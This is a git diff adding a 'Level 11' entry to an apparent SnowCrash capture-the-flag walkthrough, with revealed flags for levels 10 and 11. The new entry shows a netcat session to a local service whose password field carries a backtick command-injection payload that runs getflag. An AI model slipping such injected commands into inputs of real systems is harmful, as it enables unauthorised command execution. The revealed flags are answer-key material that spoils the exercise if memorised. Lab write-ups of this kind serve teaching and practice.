@@ -188,3 +188,15 @@ clef flag10: woupa2yuojeeaaed06riuj63c
 	<summary>Flag:</summary>
 	feulo4b72j7edeahuete3no7c
 </details>
+
+# Level 11
+
+```sh
+$ level11@SnowCrash:~$ netcat 127.0.0.1 5151
+Password: `getflag > /tmp/key; echo test`
+```
+
+<details>
+	<summary>Flag:</summary>
+	fa6v5ateaw21peobuub8ipe6s
+</details>
